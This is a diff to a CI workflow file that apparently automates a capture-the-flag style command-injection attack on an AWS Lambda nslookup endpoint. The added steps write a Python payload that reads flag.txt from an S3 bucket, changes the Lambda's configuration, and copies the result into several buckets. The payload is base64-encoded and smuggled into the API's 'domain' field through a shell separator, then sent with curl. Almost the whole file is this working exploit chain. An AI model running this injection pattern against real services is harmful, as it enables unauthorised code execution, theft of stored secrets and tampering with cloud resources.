@@ -19,27 +19,58 @@ jobs:
       - name: AWS identity
         run: aws sts get-caller-identity
 
-      - name: Inject Python exploit via base64 pipe
+      - name: Check current description (baseline before injection)
         run: |
-          B64=$(printf '%s\n' \
-            'import boto3' \
-            's3 = boto3.client("s3")' \
-            'flag = s3.get_object(Bucket="codec4f26c862a321ef5", Key="flag.txt")["Body"].read().decode()' \
-            'lmb = boto3.client("lambda", region_name="us-east-1")' \
-            'lmb.update_function_configuration(FunctionName="nslookupv2", Environment={"Variables": {"FLAG": flag}})' \
-            | base64 -w 0)
-          echo "encoded: $B64"
+          aws lambda get-function-configuration \
+            --function-name nslookupv2 --region us-east-1 \
+            --query '{Description: Description, Environment: Environment}'
+
+      - name: Build exploit Python and inject via base64
+        run: |
+          printf 'import boto3\n' > /tmp/ex.py
+          printf 'result = "START"\n' >> /tmp/ex.py
+          printf 'try:\n' >> /tmp/ex.py
+          printf '    s3 = boto3.client("s3")\n' >> /tmp/ex.py
+          printf '    flag = s3.get_object(Bucket="codec4f26c862a321ef5",Key="flag.txt")["Body"].read().decode().strip()\n' >> /tmp/ex.py
+          printf '    result = "S3OK:" + flag\n' >> /tmp/ex.py
+          printf 'except Exception as e:\n' >> /tmp/ex.py
+          printf '    result = "S3ERR:" + str(e)[:120]\n' >> /tmp/ex.py
+          printf '    flag = result\n' >> /tmp/ex.py
+          printf 'lmb = boto3.client("lambda", region_name="us-east-1")\n' >> /tmp/ex.py
+          printf 'try:\n' >> /tmp/ex.py
+          printf '    lmb.update_function_configuration(FunctionName="nslookupv2", Description=result[:250])\n' >> /tmp/ex.py
+          printf '    result += " LMBUPDATE_OK"\n' >> /tmp/ex.py
+          printf 'except Exception as e:\n' >> /tmp/ex.py
+          printf '    result += " LMBERR:" + str(e)[:120]\n' >> /tmp/ex.py
+          printf 'for b in ["site781fe43f26b9eba3","platform-bucket-009661764077-us-east-1","codec4f26c862a321ef5"]:\n' >> /tmp/ex.py
+          printf '    try:\n' >> /tmp/ex.py
+          printf '        s3.put_object(Bucket=b,Key="out.txt",Body=result.encode())\n' >> /tmp/ex.py
+          printf '        print("PUT_OK:" + b)\n' >> /tmp/ex.py
+          printf '    except Exception as e:\n' >> /tmp/ex.py
+          printf '        print("PUT_FAIL:" + b + ":" + str(e)[:80])\n' >> /tmp/ex.py
+          printf 'print(result)\n' >> /tmp/ex.py
+          echo "===== exploit script ====="
+          cat /tmp/ex.py
+          B64=$(base64 -w0 /tmp/ex.py)
+          echo "===== injecting ====="
           curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
             -H "Content-Type: application/json" \
-            -d "{\"domain\":\";echo $B64 | base64 -d | python3 2>&1\"}"
+            -d "{\"domain\":\";echo ${B64}|base64 -d|python3 2>&1\"}"
 
       - name: Wait for Lambda execution
-        run: sleep 10
+        run: sleep 12
 
-      - name: Read FLAG from Lambda env vars
+      - name: Read description back - did injection update it?
         run: |
-          echo "===== env vars ====="
           aws lambda get-function-configuration \
-            --function-name nslookupv2 \
-            --region us-east-1 \
-            --query 'Environment.Variables' || true
+            --function-name nslookupv2 --region us-east-1 \
+            --query '{Description: Description, Environment: Environment}'
+
+      - name: Try reading out.txt from all buckets
+        run: |
+          echo "===== site bucket ====="
+          aws s3 cp s3://site781fe43f26b9eba3/out.txt - || echo "not found"
+          echo "===== platform bucket ====="
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/out.txt - || echo "not found"
+          echo "===== codec bucket ====="
+          aws s3 cp s3://codec4f26c862a321ef5/out.txt - || echo "not found"
